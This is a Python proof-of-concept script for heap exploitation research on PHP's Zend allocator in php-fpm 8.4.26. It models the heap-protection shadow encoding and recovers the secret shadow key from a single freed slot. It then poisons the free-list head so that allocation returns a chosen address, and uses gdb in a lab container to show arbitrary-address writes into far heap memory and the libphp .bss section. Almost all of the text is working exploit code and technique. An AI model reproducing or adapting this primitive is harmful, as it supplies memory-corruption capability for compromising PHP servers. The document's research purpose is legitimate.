#!/usr/bin/env python3
# INDEX: shadow-encoded free-list poison, arbitrary-address write | fpm | needs per-image groom calibration
r"""ZendMM free-list in-slot next_free_slot poison -- a far/arbitrary-address heap
WRITE primitive (write-what-where) under the default ZEND_MM_HEAP_PROTECTION shadow.

Capability: given a chosen target address T, write (next=T, shadow=encode(T)) into
a controlled freed small-bin slot; the next emalloc(bin) installs T as the free-list
head and the emalloc after that RETURNS T. An ordinary PHP write into that allocation
(string body, array element, object property) then writes attacker bytes to T.

Reach: bounded only by mapped memory -- no (binbase - chunk) ASLR delta enters the
groom. Reaches far chunk offsets and, given a binbase, a php-fpm image .bss address
~TBs from the chunk.

Mechanism (Zend/zend_alloc.c, php-src 8.4.26): small bins are singly-linked free
lists; a freed slot stores next_free_slot at offset 0, and with heap protection a
SHADOW of it at slot+bin_data_size-8, encode(next)=BSWAP64(next) ^ heap->shadow_key.
The pop re-checks the shadow only when the in-slot next != NULL; a clean pop of T
needs T[0]==0 (.bss / zeroed scratch already is), else the pop panics (SIGABRT).

Preconditions:
  * shadow_key: a per-process secret at the chunk base (heap_slot=chunk+0x40),
    recovered live with no struct offset from ONE chunk-local read of a controlled
    freed slot: shadow_key = BSWAP64(next) ^ shadow.
  * chunk base: poison + far-chunk aim are chunk-local (binbase-free).
  * libphp-reach aim: needs a binbase (one pointer); read from /proc in the lab.

Not a CVE: a deliberate allocator-corruption technique, not a known bug id.

Tested: php-fpm 8.4.26. The allocator mechanism is driven against the live stock
allocator via its exported symbols (_emalloc / _efree / zend_mm_get_heap) through an
in-container gdb (the analysis instrument); the black-box groom that lands the write
on a still-linked slot is a separate per-image calibration step, not done here.
"""
from __future__ import annotations

import argparse
import os
import re
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)
from common.proc_gdb import (  # noqa: E402
    GdbDriver, compose_exec as _compose_exec, gdb as _gdb,
    pid_alive, read_maps, worker_pids,
)
from _freelist_common import (  # noqa: E402
    FORWARD_CAP, BIN_DATA_SIZE, CHUNK_ALIGN, DEFAULT_ALLOC_SIZE,
    DEFAULT_COMPOSE, MASK64, SHADOW_OFFSET, _FreeListGdb, _base_report,
    _human, _parse_tags, _report_banner,
)

DEFAULT_SERVICE = "flp-fpm"


# The pure-Python model of the heap-protection shadow (mirrors zend_alloc.c).
def bswap64(x: int) -> int:
    return struct.unpack("<Q", struct.pack(">Q", x & MASK64))[0]


def encode_shadow(next_ptr: int, shadow_key: int) -> int:
    """zend_mm_encode_free_slot (little-endian host): BSWAP64(next) ^ key."""
    return (bswap64(next_ptr) ^ shadow_key) & MASK64


def decode_shadow(shadow: int, shadow_key: int) -> int:
    """zend_mm_decode_free_slot (little-endian host): BSWAP64(shadow ^ key)."""
    return bswap64((shadow ^ shadow_key) & MASK64)


def recover_key(next_ptr: int, shadow: int) -> int:
    """shadow_key from ONE controlled freed slot: BSWAP64(next) ^ shadow.

    Derives from encode(): shadow == BSWAP64(next) ^ key  =>  key == BSWAP64(next) ^ shadow.
    Needs no zend_mm_heap struct offset -- just the slot's first qword (next) and
    its shadow qword (slot + bin_data_size - 8), both readable bytes.
    """
    return (bswap64(next_ptr) ^ shadow) & MASK64


def poison_pair(target: int, shadow_key: int):
    """Return (next_value, shadow_value) to write into a free slot so the next
    emalloc installs `target` as the free-list head (and the emalloc after that
    returns `target`)."""
    return target & MASK64, encode_shadow(target, shadow_key)


# The free-list poison driver.
class FreeListPoison(_FreeListGdb):
    """Drives the LIVE allocator via its exported symbols through gdb.

    read_shadow_key(pid)      -> (shadow_key, head, next, shadow)   [1 read]
    poison_alloc(pid, head, target, key, writeback) -> dict         [the WWW]
    """

    TAG = "FLP"

    def __init__(self, compose_file=DEFAULT_COMPOSE, service=DEFAULT_SERVICE,
                 size=DEFAULT_ALLOC_SIZE, verbose=False):
        super().__init__(compose_file, service, size, verbose)

    def read_shadow_key(self, pid):
        """ONE chunk-local read: alloc+free a slot, read its next + shadow,
        recover shadow_key with no struct offset. Returns (key, head, next, shadow)."""
        txt = _gdb(self.compose_file, self.service, pid, [
            f'set $p = (void*)_emalloc({self.size})',
            'call (void)_efree($p)',
            'printf "FLP head=%#lx\\n", (unsigned long)$p',
            'printf "FLP next=%#lx\\n", *(unsigned long*)$p',
            f'printf "FLP shadow=%#lx\\n", *(unsigned long*)((char*)$p+{SHADOW_OFFSET})',
        ])
        t = _parse_tags(txt)
        if "head" not in t or "next" not in t or "shadow" not in t:
            return None
        key = recover_key(t["next"], t["shadow"])
        if self.verbose:
            print(f"  [read] pid={pid} head={t['head']:#x} next={t['next']:#x} "
                  f"shadow={t['shadow']:#x} -> shadow_key={key:#018x}")
        return key, t["head"], t["next"], t["shadow"]

    def poison_alloc(self, pid, head, target, shadow_key,
                     corrupt_shadow=False, writeback=None, prezero_target=True,
                     writeback_full=False, nul_terminate=False, t_first=False,
                     tag="FLP", readback_tag="readback"):
        """Poison the free-list head so emalloc returns `target`, then (optionally)
        write `writeback` bytes into the returned allocation and read them back.

        corrupt_shadow=True deposits a deliberately WRONG shadow (the A/B
        negative): the pop's consistency check fails -> zend_mm_panic -> SIGABRT.

        writeback_full writes all len(writeback) bytes (the arbitrary-length body)
        instead of the 8-byte store; nul_terminate adds a trailing NUL at the
        writeback end; t_first emits $T before $head; tag/readback_tag name the
        printf labels that are parsed back.
        """
        next_val, shadow_val = poison_pair(target, shadow_key)
        if corrupt_shadow:
            shadow_val ^= 0xDEAD        # break the shadow: force the panic path
        decl = ([f'set $T = {target:#x}', f'set $head = {head:#x}'] if t_first
                else [f'set $head = {head:#x}', f'set $T = {target:#x}'])
        exprs = list(decl)
        if prezero_target and not corrupt_shadow:
            # clean pop of T: get_next_free_slot(T) sees next==NULL -> no shadow
            # check, head<-NULL. (Real targets in .bss are already zero.)
            exprs.append('set *(unsigned long*)$T = 0')
        exprs += [
            f'set *(unsigned long*)$head = {next_val:#x}',
            f'set *(unsigned long*)((char*)$head+{SHADOW_OFFSET}) = {shadow_val:#x}',
            f'set $q1 = (unsigned long)_emalloc({self.size})',
            f'printf "{tag} q1=%#lx\\n", $q1',
            f'set $q2 = (unsigned long)_emalloc({self.size})',
            f'printf "{tag} q2=%#lx\\n", $q2',
        ]
        if writeback is not None and not corrupt_shadow:
            if writeback_full:
                lit = "".join("\\%03o" % b for b in writeback)
                exprs.append(f'call (void*)memcpy($T, "{lit}", {len(writeback)})')
                if nul_terminate:
                    exprs.append(
                        f'set *(unsigned char*)((char*)$T+{len(writeback)}) = 0')
            else:
                wb = writeback[:8].ljust(8, b"\x00")
                lit = "".join("\\%03o" % b for b in wb)
                exprs.append(f'call (void*)memcpy($T, "{lit}", 8)')
            exprs.append(
                f'printf "{tag} {readback_tag}=%#lx\\n", *(unsigned long*)$T')
        txt = _gdb(self.compose_file, self.service, pid, exprs)
        t = _parse_tags(txt, tag)
        alive = pid_alive(self.compose_file, self.service, pid)
        res = {
            "pid": pid, "target": target, "q1": t.get("q1"), "q2": t.get("q2"),
            "returned_chosen": (t.get("q2") == target),
            "readback": t.get(readback_tag), "alive": alive,
            "panicked": ("SIGABRT" in txt or "zend_mm" in txt),
        }
        if self.verbose:
            print(f"  [poison] pid={pid} T={target:#x} q1={res['q1'] and hex(res['q1'])} "
                  f"q2={res['q2'] and hex(res['q2'])} chosen={res['returned_chosen']} "
                  f"alive={alive} panic={res['panicked']}")
        return res


# One full demonstration against the lab.
def demonstrate(compose_file, service, size=DEFAULT_ALLOC_SIZE, verbose=True):
    flp = FreeListPoison(compose_file, service, size=size, verbose=verbose)
    pids = worker_pids(compose_file, service)
    if not pids:
        raise RuntimeError("no fpm workers (is the lab up? curl the front once)")

    report = _base_report(pids, size)
    report["shadow_offset"] = SHADOW_OFFSET

    # Pick a target worker and recover its shadow_key (one chunk-local read).
    pid = pids[0]
    rk = flp.read_shadow_key(pid)
    if rk is None:
        raise RuntimeError(f"could not read a bin-{BIN_DATA_SIZE} slot on pid {pid}")
    key, head, nxt, shadow = rk
    report["target_pid"] = pid
    report["shadow_key"] = key
    report["model_decode_ok"] = (decode_shadow(shadow, key) == nxt)

    heap = flp.heap_of(pid)
    chunk = (heap & ~(CHUNK_ALIGN - 1)) if heap else (head & ~(CHUNK_ALIGN - 1))
    report["heap"] = heap
    report["chunk"] = chunk

    maps = read_maps(compose_file, service, pid)
    binbase = maps.binbase()
    bss = maps.image_bss()
    report["binbase"] = binbase
    report["image_bss"] = (bss["start"], bss["end"]) if bss else None

    # (A) far chunk-local target.
    far_chunk = chunk + 0x180000       # 1.5 MiB into the chunk
    report["far_chunk_target"] = far_chunk
    report["far_chunk_distance"] = far_chunk - head
    r_far = flp.poison_alloc(pid, head, far_chunk, key, writeback=b"P2SFLP_A")
    report["far_chunk"] = r_far

    # Re-read the head (the clean pop left bin head = NULL; a fresh alloc/free
    # repopulates it) for the next, independent poison.
    rk2 = flp.read_shadow_key(pid)
    if rk2:
        key, head, _, _ = rk2

    # (B) libphp (.bss) target ~TBs from the chunk -- the Apache/SHM unlock.
    report["libphp"] = None
    if bss:
        libphp_t = (bss["start"] + bss["end"]) // 2 & ~0xF   # mid-bss, zeroed
        report["libphp_target"] = libphp_t
        report["libphp_distance"] = abs(libphp_t - chunk)
        r_lib = flp.poison_alloc(pid, head, libphp_t, key, writeback=b"P2SFLP_B")
        report["libphp"] = r_lib

    return report, flp


def print_report(rep):
    P = print
    _report_banner("ZendMM free-list poison", rep["workers"])
    P("alloc size      : %d  -> bin_data_size=%d, shadow at slot+%d"
      % (rep["size"], rep["bin_data_size"], rep["shadow_offset"]))
    P("target worker   : pid %s" % rep["target_pid"])
    P("shadow_key      : %#018x  (recovered from ONE controlled freed slot;"
      % rep["shadow_key"])
    P("                   no zend_mm_heap struct offset needed)")
    P("model vs live   : decode(shadow)==next ? %s  (python model mirrors zend_alloc.c)"
      % rep["model_decode_ok"])
    P("heap / chunk    : heap=%#x  chunk=%#x  (heap_slot = chunk+0x40)"
      % (rep["heap"] or 0, rep["chunk"] or 0))
    P("binbase         : %s" % (("%#x" % rep["binbase"]) if rep["binbase"] else "n/a"))
    P("-" * 78)
    r = rep["far_chunk"]
    P("(A) FAR CHUNK aim: T=%#x  (%s forward of the groom slot)"
      % (rep["far_chunk_target"], _human(rep["far_chunk_distance"])))
    P("    emalloc returned chosen T : %s   q2=%s"
      % (r["returned_chosen"], r["q2"] and hex(r["q2"])))
    P("    worker survived           : %s" % r["alive"])
    P("    write-back read           : %s" % (r["readback"] and hex(r["readback"])))
    P("    vs var_hash_rw ~16 KiB cap         : %s past the cap"
      % ("FAR" if rep["far_chunk_distance"] > FORWARD_CAP else "within"))
    if rep.get("libphp"):
        r = rep["libphp"]
        P("-" * 78)
        P("(B) libphp .bss aim: T=%#x  (%s from the chunk -- var_hash_rw CANNOT cross this)"
          % (rep["libphp_target"], _human(rep["libphp_distance"])))
        P("    emalloc returned chosen T : %s   q2=%s"
          % (r["returned_chosen"], r["q2"] and hex(r["q2"])))
        P("    worker survived           : %s" % r["alive"])
        P("    write-back read           : %s" % (r["readback"] and hex(r["readback"])))
    P("=" * 78)


def main(argv=None):
    ap = argparse.ArgumentParser(description="ZendMM free-list poison feasibility (fpm 8.4.26)")
    ap.add_argument("--compose-file", default=DEFAULT_COMPOSE)
    ap.add_argument("--service", default=DEFAULT_SERVICE)
    ap.add_argument("--size", type=int, default=DEFAULT_ALLOC_SIZE)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation (the _compose_exec helper inherits os.environ).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-flp"
    os.environ["COMPOSE_PROFILES"] = "flp"
    rep, _ = demonstrate(a.compose_file, a.service, size=a.size)
    if a.json:
        import json
        print(json.dumps(rep, indent=2,
                         default=lambda o: hex(o) if isinstance(o, int) else o))
    else:
        print_report(rep)
    ok = rep["far_chunk"]["returned_chosen"] and rep["far_chunk"]["alive"]
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
